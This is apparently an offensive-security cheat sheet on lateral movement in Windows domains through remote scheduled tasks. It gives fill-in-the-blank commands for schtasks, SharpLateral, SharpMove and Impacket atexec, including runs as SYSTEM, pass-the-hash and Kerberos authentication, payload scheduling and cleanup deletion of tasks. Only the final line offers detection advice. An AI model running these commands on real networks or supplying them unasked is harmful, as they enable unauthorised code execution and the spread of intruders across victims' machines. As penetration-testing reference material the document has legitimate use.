---
technique: AtExec and Scheduled Tasks
category: lateral-movement
targets: Windows Workstation, Windows Server
protocols: SMB, MSRPC, ATSVC, Task Scheduler
remote_capable: true
tags: windows lateral-movement scheduled-tasks atexec schtasks impacket
---

# AtExec and Scheduled Tasks

AtExec-style movement uses the Task Scheduler or legacy AT service RPC interface to run commands on a remote Windows host. It is a useful alternative when service creation is watched but remote scheduled task creation is allowed.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Network access | SMB and task scheduler RPC access must be reachable |
| Credentials | The account must have rights to create or run tasks on the target |
| Task action | The command must be valid on the remote host |

## Windows

### Create remote task as SYSTEM

#cmd #schtasks #remote

Create a one-time task on a remote host that runs as SYSTEM.

```cmd title:"Create remote SYSTEM scheduled task"
schtasks /create /s "$rhost_name" /tn "$task_name" /tr "$command" /sc once /st "$task_time" /ru SYSTEM
```
<!-- cheat
var rhost_name
var task_name
var command
var task_time
-->

### Run remote task

#cmd #schtasks #remote

Run a scheduled task on a remote host.

```cmd title:"Run remote scheduled task"
schtasks /run /s "$rhost_name" /tn "$task_name"
```
<!-- cheat
var rhost_name
var task_name
-->

### Delete remote task

#cmd #schtasks #cleanup

Delete a scheduled task from a remote host.

```cmd title:"Delete remote scheduled task"
schtasks /delete /s "$rhost_name" /tn "$task_name" /f
```
<!-- cheat
var rhost_name
var task_name
-->

### Create remote task with credentials

#cmd #schtasks #password

Create a task on a remote host with explicit credentials.

```cmd title:"Create remote task with credentials"
schtasks /create /s "$rhost_name" /u "$domain\$user" /p "$pass" /tn "$task_name" /tr "$command" /sc once /st "$task_time"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var task_name
var command
var task_time
-->

### SharpLateral scheduled task

#cmd #sharplateral #scheduled-tasks

Schedule a payload on a remote host with SharpLateral.

```cmd title:"Schedule payload with SharpLateral"
SharpLateral.exe schedule $rhost_name $payload_path $task_name
```
<!-- cheat
var rhost_name
var payload_path
var task_name
-->

### SharpMove task scheduler

#cmd #sharpmove #scheduled-tasks

Create a remote scheduled task through SharpMove.

```cmd title:"Create remote task with SharpMove"
SharpMove.exe action=taskscheduler computername=$rhost_name command="$command" taskname=$task_name amsi=true username=$domain\$user password=$pass
```
<!-- cheat
var rhost_name
var command
var task_name
var domain
var user
var pass
-->

## Linux

### Impacket atexec password

#impacket #atexec #password

Execute a command through Impacket atexec with password authentication.

```sh title:"Run Impacket atexec with password"
atexec.py "$domain/$user:$pass@$rhost_name" "$command"
```
<!-- cheat
var domain
var user
var pass
var rhost_name
var command
-->

### Impacket atexec hash

#impacket #atexec #pth

Execute a command through Impacket atexec with NT hash authentication.

```sh title:"Run Impacket atexec with NT hash"
atexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_name" "$command"
```
<!-- cheat
var nt_hash
var domain
var user
var rhost_name
var command
-->

### Impacket atexec Kerberos

#impacket #atexec #kerberos

Execute a command through Impacket atexec with an existing Kerberos ticket.

```sh title:"Run Impacket atexec with Kerberos"
atexec.py -k -no-pass "$domain/$user@$rhost_fqdn" "$command"
```
<!-- cheat
var domain
var user
var rhost_fqdn
var command
-->

## Detection

Watch remote task creation, Event ID 4698, Task Scheduler Operational events, and short-lived tasks that run command interpreters.
